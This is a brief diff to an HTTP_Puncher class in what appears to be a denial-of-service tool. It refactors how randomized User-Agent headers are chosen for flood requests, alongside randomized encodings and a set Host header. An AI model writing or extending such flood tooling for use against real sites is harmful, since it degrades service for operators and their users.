@@ -22,8 +22,6 @@ class HTTP_Puncher(DDoS_Class):
         self.logs = logs
         self.cookie = cookie
         self.user_agents = user_agents
-        if not self.user_agents or len(self.user_agents) == 0:
-            self.user_agents = Common_Variables.user_agents_list
         self.method = method
         self.send_files=send_files
         self.stop = False
@@ -66,7 +64,7 @@ class HTTP_Puncher(DDoS_Class):
                     break
                 try:
                     req_session=requests.Session()
-                    headers={'User-Agent':random.choice(Common_Variables.user_agents_list)}
+                    headers={'User-Agent':self.get_user_agent()}
                     headers.update({"Host":self.domain})
                     for l in range(random.randint(1, 5)):
                         ed = random.choice(Common_Variables.accept_encoding_list)
